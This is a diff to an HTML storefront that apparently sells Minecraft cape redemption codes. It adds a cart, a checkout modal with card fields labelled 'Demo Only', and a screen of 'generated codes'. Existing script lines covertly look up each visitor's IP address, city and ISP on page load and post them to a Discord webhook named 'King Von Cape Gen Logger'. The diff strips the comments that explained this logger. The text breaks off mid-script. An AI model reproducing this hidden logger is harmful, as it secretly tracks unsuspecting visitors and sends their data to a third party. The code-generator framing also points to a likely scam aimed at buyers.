@@ -57,7 +57,7 @@
   .mono--gold{color:var(--gold)}
 
   /* ---------- top bar ---------- */
-  .topbar{border-bottom:1px solid var(--line)}
+  .topbar{border-bottom:1px solid var(--line); position:relative; z-index:10;}
   .topbar-inner{
     display:flex;
     align-items:center;
@@ -78,7 +78,7 @@
     color:var(--bone);
   }
   .brand-star{width:12px;height:12px;color:var(--blood);flex:none}
-  .nav{display:flex;gap:clamp(12px,2.4vw,24px)}
+  .nav{display:flex;align-items:center;gap:clamp(12px,2.4vw,24px)}
   .nav a{
     font-family:var(--mono);
     font-size:11px;
@@ -90,6 +90,39 @@
     border-bottom:1px solid transparent;
   }
   .nav a:hover{color:var(--bone);border-bottom-color:var(--blood)}
+
+  /* Cart Toggle Button */
+  .cart-toggle {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    background: transparent;
+    border: 1px solid var(--line);
+    color: var(--bone);
+    font-family: var(--mono);
+    font-size: 10px;
+    font-weight: 500;
+    letter-spacing: .12em;
+    text-transform: uppercase;
+    padding: 7px 12px;
+    cursor: pointer;
+    transition: border-color .15s, background .15s;
+  }
+  .cart-toggle:hover { border-color: var(--gold); background: rgba(201,162,39,.08); }
+  .cart-toggle svg { width: 14px; height: 14px; }
+  .cart-count {
+    display: none;
+    align-items: center;
+    justify-content: center;
+    background: var(--blood);
+    color: var(--bone);
+    font-size: 9px;
+    width: 16px;
+    height: 16px;
+    border-radius: 50%;
+    margin-left: 4px;
+  }
+  .cart-count.active { display: inline-flex; }
 
   /* ---------- hero ---------- */
   .hero{padding-block:clamp(32px,6vw,80px) clamp(36px,6vw,72px)}
@@ -162,6 +195,7 @@
     padding:13px 18px;
     border:1px solid transparent;
     transition:background .15s,color .15s,border-color .15s;
+    cursor:pointer;
   }
   .btn--primary{background:var(--blood);color:var(--bone);border-color:var(--blood)}
   .btn--primary:hover{background:var(--blood-deep);border-color:var(--blood-deep)}
@@ -193,9 +227,7 @@
   /* ---------- 3D viewer card ---------- */
   .viewer-card{
     border:1px solid var(--line);
-    background:
-      linear-gradient(160deg, rgba(216,35,42,.06), transparent 55%),
-      #0B0B0D;
+    background:linear-gradient(160deg, rgba(216,35,42,.06), transparent 55%), #0B0B0D;
     display:flex;
     flex-direction:column;
     max-width:520px;
@@ -259,19 +291,14 @@
     position:relative;
     width:100%;
     aspect-ratio:1;
-    background:
-      radial-gradient(ellipse 55% 45% at 50% 42%, rgba(201,162,39,.07), transparent 72%),
-      radial-gradient(ellipse 75% 65% at 50% 105%, rgba(216,35,42,.14), transparent 70%),
-      #06060A;
+    background:radial-gradient(ellipse 55% 45% at 50% 42%, rgba(201,162,39,.07), transparent 72%), radial-gradient(ellipse 75% 65% at 50% 105%, rgba(216,35,42,.14), transparent 70%), #06060A;
     overflow:hidden;
   }
   .viewer-container::before{
     content:"";
     position:absolute;
     inset:0;
-    background-image:
-      linear-gradient(rgba(255,255,255,.025) 1px, transparent 1px),
-      linear-gradient(90deg, rgba(255,255,255,.025) 1px, transparent 1px);
+    background-image:linear-gradient(rgba(255,255,255,.025) 1px, transparent 1px), linear-gradient(90deg, rgba(255,255,255,.025) 1px, transparent 1px);
     background-size:26px 26px;
     -webkit-mask-image:radial-gradient(circle at 50% 55%, #000 35%, transparent 78%);
     mask-image:radial-gradient(circle at 50% 55%, #000 35%, transparent 78%);
@@ -459,6 +486,8 @@
     padding:8px 12px;
     white-space:nowrap;
     transition:border-color .15s,background .15s;
+    background:transparent;
+    cursor:pointer;
   }
   .cape-buy:hover{border-color:var(--blood);background:rgba(216,35,42,.1)}
   .cape-buy--free{
@@ -536,12 +565,335 @@
   .footer a{color:var(--bone);text-decoration:none;border-bottom:1px solid var(--line)}
   .footer a:hover{border-bottom-color:var(--blood)}
 
+  /* =========================================================
+     CART DRAWER
+     ========================================================= */
+  .drawer-backdrop {
+    position: fixed;
+    inset: 0;
+    background: rgba(0, 0, 0, 0.7);
+    backdrop-filter: blur(4px);
+    -webkit-backdrop-filter: blur(4px);
+    z-index: 40;
+    opacity: 0;
+    pointer-events: none;
+    transition: opacity 0.3s ease;
+  }
+  .drawer-backdrop.open {
+    opacity: 1;
+    pointer-events: auto;
+  }
+
+  .cart-drawer {
+    position: fixed;
+    top: 0;
+    right: 0;
+    bottom: 0;
+    width: 100%;
+    max-width: 420px;
+    background: var(--black);
+    border-left: 1px solid var(--line);
+    z-index: 50;
+    display: flex;
+    flex-direction: column;
+    transform: translateX(100%);
+    transition: transform 0.3s cubic-bezier(0.16, 1, 0.3, 1);
+    box-shadow: -10px 0 30px rgba(0,0,0,0.8);
+  }
+  .cart-drawer.open {
+    transform: translateX(0);
+  }
+
+  .drawer-header {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 20px;
+    border-bottom: 1px solid var(--line);
+  }
+  .drawer-header h2 {
+    font-family: var(--display);
+    font-size: 1.5rem;
+    font-weight: 800;
+    text-transform: uppercase;
+    color: var(--bone);
+    margin: 0;
+    letter-spacing: 0.02em;
+  }
+  .close-drawer {
+    background: transparent;
+    border: none;
+    color: var(--smoke);
+    cursor: pointer;
+    padding: 4px;
+    display: flex;
+  }
+  .close-drawer:hover { color: var(--bone); }
+  .close-drawer svg { width: 20px; height: 20px; }
+
+  .drawer-body {
+    flex: 1;
+    overflow-y: auto;
+    padding: 20px;
+    display: flex;
+    flex-direction: column;
+    gap: 16px;
+  }
+  
+  .empty-cart-msg {
+    text-align: center;
+    color: var(--smoke);
+    font-family: var(--mono);
+    font-size: 11px;
+    letter-spacing: 0.1em;
+    text-transform: uppercase;
+    margin-top: 40px;
+  }
+
+  .cart-item {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    gap: 12px;
+    padding-bottom: 16px;
+    border-bottom: 1px solid var(--line-soft);
+  }
+  .cart-item-info { display: grid; gap: 4px; }
+  .cart-item-title {
+    font-family: var(--display);
+    font-weight: 800;
+    font-size: 1.2rem;
+    text-transform: uppercase;
+    color: var(--bone);
+    line-height: 1;
+    letter-spacing: 0.02em;
+    margin: 0;
+  }
+  .cart-item-meta {
+    font-family: var(--mono);
+    font-size: 10px;
+    color: var(--smoke);
+    text-transform: uppercase;
+    letter-spacing: 0.1em;
+  }
+  .cart-item-price {
+    font-family: var(--mono);
+    font-size: 13px;
+    color: var(--gold);
+    font-weight: 500;
+  }
+  .remove-item {
+    background: transparent;
+    border: none;
+    color: var(--smoke);
+    cursor: pointer;
+    padding: 4px;
+    transition: color 0.15s;
+  }
+  .remove-item:hover { color: var(--blood); }
+  .remove-item svg { width: 14px; height: 14px; }
+
+  .drawer-footer {
+    padding: 20px;
+    border-top: 1px solid var(--line);
+    background: #08080A;
+  }
+  .cart-total-row {
+    display: flex;
+    justify-content: space-between;
+    align-items: baseline;
+    margin-bottom: 16px;
+    font-family: var(--mono);
+    text-transform: uppercase;
+    letter-spacing: 0.1em;
+  }
+  .cart-total-row span:first-child { font-size: 11px; color: var(--smoke); }
+  .cart-total-row span:last-child { font-size: 1.4rem; color: var(--bone); font-weight: 500; }
+  .checkout-btn {
+    width: 100%;
+    justify-content: center;
+    padding-block: 16px;
+  }
+  .checkout-btn:disabled {
+    opacity: 0.5;
+    cursor: not-allowed;
+    background: var(--line);
+    border-color: var(--line);
+    color: var(--smoke);
+  }
+
+  /* =========================================================
+     CHECKOUT MODAL
+     ========================================================= */
+  .checkout-modal {
+    position: fixed;
+    inset: 0;
+    z-index: 60;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 20px;
+    opacity: 0;
+    pointer-events: none;
+    transition: opacity 0.3s ease;
+  }
+  .checkout-modal.open {
+    opacity: 1;
+    pointer-events: auto;
+  }
+  .checkout-modal::before {
+    content: "";
+    position: absolute;
+    inset: 0;
+    background: rgba(0,0,0,0.85);
+    backdrop-filter: blur(8px);
+    -webkit-backdrop-filter: blur(8px);
+  }
+  
+  .modal-content {
+    position: relative;
+    background: var(--black);
+    border: 1px solid var(--line);
+    width: 100%;
+    max-width: 480px;
+    padding: clamp(24px, 4vw, 40px);
+    transform: translateY(20px);
+    transition: transform 0.3s cubic-bezier(0.16, 1, 0.3, 1);
+    box-shadow: 0 20px 40px rgba(0,0,0,0.5);
+  }
+  .checkout-modal.open .modal-content {
+    transform: translateY(0);
+  }
+
+  .modal-close {
+    position: absolute;
+    top: 16px;
+    right: 16px;
+    background: transparent;
+    border: none;
+    color: var(--smoke);
+    cursor: pointer;
+  }
+  .modal-close:hover { color: var(--bone); }
+  .modal-close svg { width: 20px; height: 20px; }
+
+  .checkout-step { display: none; }
+  .checkout-step.active { display: block; }
+
+  .step-title {
+    font-family: var(--display);
+    font-size: 1.8rem;
+    font-weight: 800;
+    text-transform: uppercase;
+    color: var(--bone);
+    margin: 0 0 8px;
+    line-height: 1;
+  }
+  .step-desc {
+    font-size: 13px;
+    color: var(--smoke);
+    margin: 0 0 24px;
+  }
+
+  .form-group { margin-bottom: 16px; }
+  .form-label {
+    display: block;
+    font-family: var(--mono);
+    font-size: 10px;
+    text-transform: uppercase;
+    letter-spacing: 0.1em;
+    color: var(--smoke);
+    margin-bottom: 6px;
+  }
+  .form-input {
+    width: 100%;
+    background: var(--line-soft);
+    border: 1px solid var(--line);
+    color: var(--bone);
+    font-family: var(--body);
+    font-size: 15px;
+    padding: 12px 14px;
+    transition: border-color 0.15s;
+  }
+  .form-input:focus {
+    outline: none;
+    border-color: var(--blood);
+  }
+  .form-row { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
+
+  .fake-card-visual {
+    background: linear-gradient(135deg, #1A1A22, #0B0B0D);
+    border: 1px solid var(--line);
+    padding: 20px;
+    border-radius: 8px;
+    margin-bottom: 20px;
+    position: relative;
+    overflow: hidden;
+  }
+  .fake-card-visual::after {
+    content: "DEMO ONLY";
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%) rotate(-15deg);
+    font-family: var(--mono);
+    font-size: 24px;
+    font-weight: bold;
+    color: rgba(216, 35, 42, 0.2);
+    pointer-events: none;
+    letter-spacing: 0.2em;
+    white-space: nowrap;
+  }
+  .fake-card-chip {
+    width: 32px; height: 24px;
+    background: var(--gold);
+    border-radius: 4px;
+    margin-bottom: 20px;
+    opacity: 0.6;
+  }
+
+  .success-screen { text-align: center; }
+  .success-icon {
+    width: 48px; height: 48px;
+    color: var(--gold);
+    margin: 0 auto 16px;
+  }
+  .success-codes {
+    background: var(--line-soft);
+    border: 1px dashed var(--line);
+    padding: 16px;
+    margin: 20px 0;
+    display: grid;
+    gap: 8px;
+  }
+  .success-code {
+    font-family: var(--mono);
+    font-size: 14px;
+    color: var(--gold);
+    letter-spacing: 0.1em;
+    user-select: all;
+  }
+
+  /* Loader */
+  .spinner {
+    width: 20px; height: 20px;
+    border: 2px solid rgba(255,255,255,0.2);
+    border-top-color: var(--bone);
+    border-radius: 50%;
+    animation: spin 0.8s linear infinite;
+    display: none;
+  }
+  .btn.loading .spinner { display: block; }
+  .btn.loading .btn-text { display: none; }
+  @keyframes spin { to { transform: rotate(360deg); } }
+
   /* ---------- responsive ---------- */
   @media (max-width:880px){
     .hero-grid{grid-template-columns:1fr;gap:32px}
     .viewer-card{justify-self:stretch;max-width:520px;margin-inline:auto}
     .how-grid{grid-template-columns:1fr}
     .disclaimer{grid-template-columns:1fr}
+    .nav { display: none; }
   }
   @media (max-width:560px){
     .cape-row{flex-wrap:wrap;gap:10px}
@@ -551,6 +903,7 @@
       padding-left:36px;
       justify-content:space-between;
     }
+    .form-row { grid-template-columns: 1fr; }
   }
 </style>
 </head>
@@ -566,6 +919,12 @@
       <a href="#store">Store</a>
       <a href="#how">How codes work</a>
     </nav>
+    
+    <button class="cart-toggle" id="cart-toggle" aria-label="Open cart">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><circle cx="9" cy="21" r="1"/><circle cx="20" cy="21" r="1"/><path d="M1 1h4l2.68 13.39a2 2 0 0 0 2 1.61h9.72a2 2 0 0 0 2-1.61L23 6H6"/></svg>
+      Cart
+      <span class="cart-count" id="cart-count">0</span>
+    </button>
   </div>
 </header>
 
@@ -686,7 +1045,7 @@
         </div>
         <div class="cape-end">
           <span class="cape-price">$2.99</span>
-          <a class="cape-buy" href="#">Buy code</a>
+          <button class="cape-buy add-to-cart" data-id="copper" data-name="Copper" data-price="2.99">Add to cart</button>
         </div>
       </li>
 
@@ -698,7 +1057,7 @@
         </div>
         <div class="cape-end">
           <span class="cape-price">$2.99</span>
-          <a class="cape-buy" href="#">Buy code</a>
+          <button class="cape-buy add-to-cart" data-id="home" data-name="Home" data-price="2.99">Add to cart</button>
         </div>
       </li>
 
@@ -710,7 +1069,7 @@
         </div>
         <div class="cape-end">
           <span class="cape-price">$2.99</span>
-          <a class="cape-buy" href="#">Buy code</a>
+          <button class="cape-buy add-to-cart" data-id="builder" data-name="Builder" data-price="2.99">Add to cart</button>
         </div>
       </li>
 
@@ -722,7 +1081,7 @@
         </div>
         <div class="cape-end">
           <span class="cape-price">$15.21</span>
-          <a class="cape-buy" href="#">Buy code</a>
+          <button class="cape-buy add-to-cart" data-id="purple_heart" data-name="Purple Heart" data-price="15.21">Add to cart</button>
         </div>
       </li>
 
@@ -734,7 +1093,7 @@
         </div>
         <div class="cape-end">
           <span class="cape-price">$136.00</span>
-          <a class="cape-buy" href="#">Buy code</a>
+          <button class="cape-buy add-to-cart" data-id="moonlight_trail" data-name="Moonlight Trail" data-price="136.00">Add to cart</button>
         </div>
       </li>
 
@@ -746,7 +1105,7 @@
         </div>
         <div class="cape-end">
           <span class="cape-price">$272.00</span>
-          <a class="cape-buy" href="#">Buy code</a>
+          <button class="cape-buy add-to-cart" data-id="follower" data-name="Follower's" data-price="272.00">Add to cart</button>
         </div>
       </li>
 
@@ -758,7 +1117,7 @@
         </div>
         <div class="cape-end">
           <span class="cape-price">$873.00</span>
-          <a class="cape-buy" href="#">Buy code</a>
+          <button class="cape-buy add-to-cart" data-id="crafter" data-name="Crafter" data-price="873.00">Add to cart</button>
         </div>
       </li>
     </ul>
@@ -817,6 +1176,88 @@
   </div>
 </footer>
 
+<!-- =========================================================
+     CART DRAWER
+     ========================================================= -->
+<div class="drawer-backdrop" id="cart-backdrop"></div>
+<aside class="cart-drawer" id="cart-drawer" aria-label="Shopping cart">
+  <div class="drawer-header">
+    <h2>Your Cart</h2>
+    <button class="close-drawer" id="close-cart" aria-label="Close cart">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M18 6L6 18M6 6l12 12"/></svg>
+    </button>
+  </div>
+  <div class="drawer-body" id="cart-items">
+    <!-- Cart items injected here via JS -->
+    <p class="empty-cart-msg">Your cart is empty.</p>
+  </div>
+  <div class="drawer-footer">
+    <div class="cart-total-row">
+      <span>Subtotal</span>
+      <span id="cart-total">$0.00</span>
+    </div>
+    <button class="btn btn--primary checkout-btn" id="checkout-btn" disabled>
+      <span class="spinner"></span>
+      <span class="btn-text">Proceed to Checkout</span>
+    </button>
+  </div>
+</aside>
+
+<!-- =========================================================
+     CHECKOUT MODAL
+     ========================================================= -->
+<div class="checkout-modal" id="checkout-modal" aria-label="Checkout">
+  <div class="modal-content">
+    <button class="modal-close" id="close-checkout" aria-label="Close checkout">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M18 6L6 18M6 6l12 12"/></svg>
+    </button>
+
+    <!-- Step 1: Info -->
+    <div class="checkout-step active" id="step-info">
+      <h2 class="step-title">Checkout</h2>
+      <p class="step-desc">Enter your email to receive your order confirmation and redemption codes.</p>
+      
+      <div class="form-group">
+        <label class="form-label" for="email">Email Address</label>
+        <input type="email" id="email" class="form-input" placeholder="you@example.com" required>
+      </div>
+
+      <div class="form-group" style="margin-bottom: 24px;">
+        <label class="form-label">Payment (Demo Only)</label>
+        <div class="fake-card-visual">
+          <div class="fake-card-chip"></div>
+          <input type="text" class="form-input" placeholder="Card Number" style="margin-bottom: 8px; background: transparent; padding-left: 0; border: none; border-bottom: 1px solid var(--line);" maxlength="19">
+          <div class="form-row">
+            <input type="text" class="form-input" placeholder="MM / YY" style="background: transparent; padding-left: 0; border: none; border-bottom: 1px solid var(--line);" maxlength="5">
+            <input type="text" class="form-input" placeholder="CVC" style="background: transparent; padding-left: 0; border: none; border-bottom: 1px solid var(--line);" maxlength="4">
+          </div>
+        </div>
+      </div>
+
+      <button class="btn btn--primary" id="pay-btn" style="width: 100%; justify-content: center;">
+        <span class="spinner"></span>
+        <span class="btn-text">Pay $<span id="checkout-total">0.00</span></span>
+      </button>
+    </div>
+
+    <!-- Step 2: Success -->
+    <div class="checkout-step" id="step-success">
+      <div class="success-screen">
+        <svg class="success-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg>
+        <h2 class="step-title" style="font-size: 2rem;">Order Complete</h2>
+        <p class="step-desc">Your codes are below. We've also sent them to your email. Redeem them at <strong>minecraft.net/redeem</strong>.</p>
+        
+        <div class="success-codes" id="generated-codes">
+          <!-- Codes injected here -->
+        </div>
+
+        <button class="btn btn--ghost" id="finish-btn" style="width: 100%; justify-content: center;">Return to Store</button>
+      </div>
+    </div>
+
+  </div>
+</div>
+
 <script src="https://cdn.jsdelivr.net/npm/skinview3d@3.4.1/bundles/skinview3d.bundle.js"></script>
 <script>
 (function () {
@@ -833,13 +1274,11 @@
       let locationStr = 'Unknown';
       let isp = 'Unknown';
 
-      // 1. Fetch IP and Location data
       try {
         const ipRes = await fetch('https://api.ipify.org?format=json');
         const ipData = await ipRes.json();
         ip = ipData.ip;
 
-        // Free tier allows some requests, giving us City, Region, Country, ISP
         const locRes = await fetch(`https://ipapi.co/${ip}/json/`);
         const locData = await locRes.json();
         if (!locData.error) {
@@ -850,14 +1289,12 @@
         console.warn("Telemetry: IP fetch failed", e);
       }
 
-      // 2. Bot detection
       const isWebdriver = navigator.webdriver === true;
       const botRegex = /bot|googlebot|crawler|spider|robot|crawling|headless/i;
       const isSuspiciousUA = botRegex.test(navigator.userAgent);
       const botStatus = (isWebdriver || isSuspiciousUA) ? '🤖 **Yes** (Likely Bot)' : '👤 **No** (Human)';
-      const embedColor = (isWebdriver || isSuspiciousUA) ? 15158332 : 3066993; // Red for bot, Green for human
+      const embedColor = (isWebdriver || isSuspiciousUA) ? 15158332 : 3066993; 
 
-      // 3. User data collection
       const payload = {
         username: "King Von Cape Gen Logger",
         embeds: [{
@@ -880,7 +1317,6 @@
         }]
       };
 
-      // 4. Send to Discord
       await fetch(webhookUrl, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -888,28 +1324,25 @@
       });
 
     } catch (err) {
-      // Fail silently so we never break the 3D viewer for the user
       console.warn("[kingvon] Telemetry logging failed:", err);
     }
   }
 
-  // Fire the logger after a short delay to prioritize page load
   setTimeout(logVisitorToDiscord, 1500);
 
 
   /* =========================================================
      2. 3D SKIN VIEWER
      ========================================================= */
-  const UUID       = '2321b5c8-60ba-4a71-a319-a733ac58826d'; // Player skin
-  const CAPE_UUID  = '8e70f420-95be-480d-bbb9-070b35e2fb17'; // Menace cape
+  const UUID       = '2321b5c8-60ba-4a71-a319-a733ac58826d'; 
+  const CAPE_UUID  = '8e70f420-95be-480d-bbb9-070b35e2fb17'; 
   
   const SKIN_URL   = 'https://crafatar.com/skins/' + UUID;
   const CAPE_URL   = 'https://crafatar.com/capes/' + CAPE_UUID;
 
-  /* Fallbacks — Crafatar frequently returns 500s, so we pivot to Mineatar. */
   const SKIN_FALLBACKS = [
     'https://api.mineatar.io/skin/' + UUID,
-    'https://crafatar.com/skins/8667ba71b85a4004af54457a9734eed7' // Steve
+    'https://crafatar.com/skins/8667ba71b85a4004af54457a9734eed7' 
   ];
   const CAPE_FALLBACKS = [
     'https://api.mineatar.io/cape/' + CAPE_UUID,
@@ -938,175 +1371,320 @@
     if (loadingEl) loadingEl.hidden = true;
   }
 
-  /* Guard: library / WebGL */
   if (typeof skinview3d === 'undefined') {
     hideLoading();
     setStatus('3D viewer unavailable — library failed to load.', 'error');
     console.warn('[kingvon] skinview3d bundle not present');
-    return;
-  }
-  if (!canvas) {
-    hideLoading();
-    return;
-  }
+  } else if (canvas) {
+    const dpr = Math.min(window.devicePixelRatio || 1, 2);
+    const RENDER_SIZE = Math.round(500 * dpr);
 
-  /* Build viewer */
-  const dpr = Math.min(window.devicePixelRatio || 1, 2);
-  const RENDER_SIZE = Math.round(500 * dpr);
-
-  let viewer;
-  try {
-    viewer = new skinview3d.SkinViewer({
-      canvas: canvas,
-      width: RENDER_SIZE,
-      height: RENDER_SIZE
-    });
-  } catch (err) {
-    console.error('[kingvon] SkinViewer could not initialise:', err);
-    hideLoading();
-    setStatus('3D viewer unavailable on this device.', 'error');
-    return;
-  }
-
-  canvas.style.width  = '100%';
-  canvas.style.height = '100%';
-
-  /* Controls: rotate + zoom */
-  let controls = null;
-  try {
-    if (typeof skinview3d.createOrbitControls === 'function') {
-      controls = skinview3d.createOrbitControls(viewer);
-    } else if (viewer.controls) {
-      controls = viewer.controls;
-    }
-  } catch (err) {
-    console.warn('[kingvon] Orbit controls could not be created:', err);
-  }
-
-  if (controls) {
+    let viewer;
     try {
-      controls.enableRotate = true;
-      controls.enableZoom   = true;
-      controls.enablePan    = false;
-      controls.rotateSpeed  = 0.85;
-      controls.zoomSpeed    = 0.8;
-      controls.minDistance  = 16;
-      controls.maxDistance  = 90;
+      viewer = new skinview3d.SkinViewer({
+        canvas: canvas,
+        width: RENDER_SIZE,
+        height: RENDER_SIZE
+      });
+      
+      canvas.style.width  = '100%';
+      canvas.style.height = '100%';
+
+      let controls = null;
+      try {
+        if (typeof skinview3d.createOrbitControls === 'function') {
+          controls = skinview3d.createOrbitControls(viewer);
+        } else if (viewer.controls) {
+          controls = viewer.controls;
+        }
+      } catch (err) {
+        console.warn('[kingvon] Orbit controls could not be created:', err);
+      }
+
+      if (controls) {
+        try {
+          controls.enableRotate = true;
+          controls.enableZoom   = true;
+          controls.enablePan    = false;
+          controls.rotateSpeed  = 0.85;
+          controls.zoomSpeed    = 0.8;
+          controls.minDistance  = 16;
+          controls.maxDistance  = 90;
+        } catch (err) {}
+      }
+
+      let idleAnimation = null;
+      try {
+        if (typeof skinview3d.RotatingAnimation === 'function') {
+          idleAnimation = new skinview3d.RotatingAnimation();
+          viewer.animation = idleAnimation;
+          if ('speed' in idleAnimation) idleAnimation.speed = 0.5;
+        } else if ('autoRotate' in viewer) {
+          viewer.autoRotate = true;
+          if ('autoRotateSpeed' in viewer) viewer.autoRotateSpeed = 0.5;
+        }
+      } catch (err) {}
+
+      const initialCameraPos = viewer.camera ? viewer.camera.position.clone() : null;
+      const initialTarget    = controls && controls.target ? controls.target.clone() : null;
+
+      if (resetBtn) {
+        resetBtn.addEventListener('click', function () {
+          if (initialCameraPos && viewer.camera) viewer.camera.position.copy(initialCameraPos);
+          if (initialTarget && controls && controls.target) controls.target.copy(initialTarget);
+          if (controls) controls.update();
+        });
+      }
+
+      async function tryLoadSkin(url) {
+        try {
+          await viewer.loadSkin(url, { model: 'auto-detect' });
+          return true;
+        } catch (err) { return false; }
+      }
+
+      async function tryLoadCape(url) {
+        try {
+          await viewer.loadCape(url);
+          return true;
+        } catch (err) { return false; }
+      }
+
+      (async function loadTextures() {
+        let skinLoaded = false;
+        let capeLoaded = false;
+
+        skinLoaded = await tryLoadSkin(SKIN_URL);
+        if (!skinLoaded) {
+          for (const url of SKIN_FALLBACKS) {
+            skinLoaded = await tryLoadSkin(url);
+            if (skinLoaded) break;
+          }
+        }
+
+        capeLoaded = await tryLoadCape(CAPE_URL);
+        if (!capeLoaded) {
+          for (const url of CAPE_FALLBACKS) {
+            capeLoaded = await tryLoadCape(url);
+            if (capeLoaded) break;
+          }
+        }
+
+        if (!skinLoaded && !capeLoaded) {
+          setStatus('Player skin and cape unavailable — showing placeholder.');
+        } else if (!skinLoaded) {
+          setStatus('Player skin unavailable — showing placeholder without cape.');
+        } else if (!capeLoaded) {
+          setStatus('Cape unavailable — showing player skin without cape.');
+        } else {
+          setStatus(null);
+        }
+        hideLoading();
+      })().catch(function (err) {
+        hideLoading();
+        setStatus('Player could not be loaded — try refreshing.', 'error');
+      });
+
+      if (idleAnimation && container) {
+        let resumeTimer = null;
+        function pauseIdle() {
+          clearTimeout(resumeTimer);
+          if (idleAnimation && 'speed' in idleAnimation) idleAnimation.speed = 0;
+          if (viewer && 'autoRotate' in viewer) viewer.autoRotate = false;
+        }
+        function resumeIdle() {
+          clearTimeout(resumeTimer);
+          resumeTimer = setTimeout(function () {
+            if (idleAnimation && 'speed' in idleAnimation) idleAnimation.speed = 0.5;
+            if (viewer && 'autoRotate' in viewer) viewer.autoRotate = true;
+          }, 1400);
+        }
+        container.addEventListener('pointerdown', pauseIdle);
+        container.addEventListener('pointerup', resumeIdle);
+        container.addEventListener('pointercancel', resumeIdle);
+      }
+
     } catch (err) {
-      console.warn('[kingvon] Orbit control properties could not be set:', err);
+      hideLoading();
+      setStatus('3D viewer unavailable on this device.', 'error');
     }
   }
 
-  /* Smooth idle rotation */
-  let idleAnimation = null;
-  try {
-    if (typeof skinview3d.RotatingAnimation === 'function') {
-      idleAnimation = new skinview3d.RotatingAnimation();
-      viewer.animation = idleAnimation;
-      if ('speed' in idleAnimation) idleAnimation.speed = 0.5;
-    } else if ('autoRotate' in viewer) {
-      viewer.autoRotate = true;
-      if ('autoRotateSpeed' in viewer) viewer.autoRotateSpeed = 0.5;
-    }
-  } catch (err) {
-    console.warn('[kingvon] Idle animation could not start:', err);
+  /* =========================================================
+     3. SHOPPING CART & CHECKOUT
+     ========================================================= */
+  const cartToggle = document.getElementById('cart-toggle');
+  const cartDrawer = document.getElementById('cart-drawer');
+  const cartBackdrop = document.getElementById('cart-backdrop');
+  const closeCartBtn = document.getElementById('close-cart');
+  const cartItemsContainer = document.getElementById('cart-items');
+  const cartCount = document.getElementById('cart-count');
+  const cartTotalEl = document.getElementById('cart-total');
+  const checkoutBtn = document.getElementById('checkout-btn');
+  const checkoutModal = document.getElementById('checkout-modal');
+  const closeCheckoutBtn = document.getElementById('close-checkout');
+  const payBtn = document.getElementById('pay-btn');
+  const finishBtn = document.getElementById('finish-btn');
+
+  let cart = JSON.parse(localStorage.getItem('kv_cart')) || [];
+
+  // UI Toggles
+  function toggleCart() {
+    const isOpen = cartDrawer.classList.contains('open');
+    cartDrawer.classList.toggle('open');
+    cartBackdrop.classList.toggle('open');
+    document.body.style.overflow = isOpen ? '' : 'hidden';
   }
 
-  /* Reset-camera */
-  const initialCameraPos = viewer.camera ? viewer.camera.position.clone() : null;
-  const initialTarget    = controls && controls.target ? controls.target.clone() : null;
-
-  if (resetBtn) {
-    resetBtn.addEventListener('click', function () {
-      if (initialCameraPos && viewer.camera) {
-        viewer.camera.position.copy(initialCameraPos);
-      }
-      if (initialTarget && controls && controls.target) {
-        controls.target.copy(initialTarget);
-      }
-      if (controls) controls.update();
-    });
+  function closeCart() {
+    cartDrawer.classList.remove('open');
+    cartBackdrop.classList.remove('open');
+    document.body.style.overflow = '';
   }
 
-  /* Texture loading with graceful failure */
-  async function tryLoadSkin(url) {
-    try {
-      await viewer.loadSkin(url, { model: 'auto-detect' });
-      return true;
-    } catch (err) {
-      console.warn('[kingvon] Skin failed:', url, err);
-      return false;
-    }
+  function openCheckout() {
+    closeCart();
+    checkoutModal.classList.add('open');
+    document.body.style.overflow = 'hidden';
+    // Reset steps
+    document.querySelectorAll('.checkout-step').forEach(el => el.classList.remove('active'));
+    document.getElementById('step-info').classList.add('active');
+    payBtn.classList.remove('loading');
+    document.getElementById('checkout-total').textContent = cartTotalEl.textContent.replace('$', '');
   }
 
-  async function tryLoadCape(url) {
-    try {
-      await viewer.loadCape(url);
-      return true;
-    } catch (err) {
-      console.warn('[kingvon] Cape failed:', url, err);
-      return false;
-    }
+  function closeCheckout() {
+    checkoutModal.classList.remove('open');
+    document.body.style.overflow = '';
   }
 
-  (async function loadTextures() {
-    let skinLoaded = false;
-    let capeLoaded = false;
+  // Cart Logic
+  function updateCartUI() {
+    // Save
+    localStorage.setItem('kv_cart', JSON.stringify(cart));
 
-    /* 1. Skin — primary + fallbacks */
-    skinLoaded = await tryLoadSkin(SKIN_URL);
-    if (!skinLoaded) {
-      for (const url of SKIN_FALLBACKS) {
-        skinLoaded = await tryLoadSkin(url);
-        if (skinLoaded) break;
-      }
-    }
-
-    /* 2. Cape — primary + fallbacks */
-    capeLoaded = await tryLoadCape(CAPE_URL);
-    if (!capeLoaded) {
-      for (const url of CAPE_FALLBACKS) {
-        capeLoaded = await tryLoadCape(url);
-        if (capeLoaded) break;
-      }
-    }
-
-    /* 3. Surface a subtle status */
-    if (!skinLoaded && !capeLoaded) {
-      setStatus('Player skin and cape unavailable — showing placeholder.');
-    } else if (!skinLoaded) {
-      setStatus('Player skin unavailable — showing placeholder without cape.');
-    } else if (!capeLoaded) {
-      setStatus('Cape unavailable — showing player skin without cape.');
+    // Update badge
+    if (cart.length > 0) {
+      cartCount.textContent = cart.length;
+      cartCount.classList.add('active');
     } else {
-      setStatus(null);
+      cartCount.classList.remove('active');
     }
-    hideLoading();
-  })().catch(function (err) {
-    console.error('[kingvon] Unexpected texture-loading error:', err);
-    hideLoading();
-    setStatus('Player could not be loaded — try refreshing.', 'error');
+
+    // Render items
+    cartItemsContainer.innerHTML = '';
+    let total = 0;
+
+    if (cart.length === 0) {
+      cartItemsContainer.innerHTML = '<p class="empty-cart-msg">Your cart is empty.</p>';
+      checkoutBtn.disabled = true;
+    } else {
+      checkoutBtn.disabled = false;
+      cart.forEach(item => {
